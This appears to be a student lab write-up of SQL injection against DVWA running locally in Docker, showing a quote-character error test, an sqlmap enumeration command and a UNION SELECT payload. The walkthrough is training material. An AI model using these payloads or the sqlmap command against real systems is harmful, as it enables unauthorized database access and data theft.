# 💉 SQL Injection – DVWA

## 📌 Overview
In this task, I performed SQL Injection attacks on DVWA (Damn Vulnerable Web Application) to understand how improper input handling can lead to database compromise.

The testing was done in a controlled Docker environment.

---

##  Target
- Application: DVWA  
- URL: http://localhost:8081  
- Module: SQL Injection  
- Security Level: LOW  
<img width="1716" height="792" alt="sql-00" src="https://github.com/user-attachments/assets/ff2909fe-398c-46ea-bf83-93b3857eefa5" />


---

## Steps Performed

### 1. Access DVWA
- Logged into DVWA using: <br>
Username: admin <br>
Password: password <br>
- Set security level to **LOW**

---

### 2. Identify Input Field
- Navigated to:
DVWA → Vulnerabilities → SQL Injection
- Observed input parameter:
id=1
<img width="1717" height="797" alt="sql-0" src="https://github.com/user-attachments/assets/f6037136-9994-4263-b048-7759fd399c58" />

---

### 3. Basic SQL Injection Test

#### Payload Used:
```sql
'
```
#### Observation:
<img width="1719" height="803" alt="sql-1" src="https://github.com/user-attachments/assets/632ceecc-2536-4801-b6de-7a6a61c93a7b" />
Application returned SQL error
Confirmed input is not sanitized

---

### Automated Testing (SQLMap)
```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=yourid; security=low" -p id --dbs
```
<img width="1708" height="783" alt="sql-5" src="https://github.com/user-attachments/assets/f6875c21-b040-4835-b6f3-14a11113e3d6" />

---

### UNION Injection (Database)
```bash
' UNION SELECT null, database()-- -
```
<img width="1720" height="794" alt="sql-4" src="https://github.com/user-attachments/assets/9314b67a-6cf6-4521-bbd4-7e02f4c533f0" />
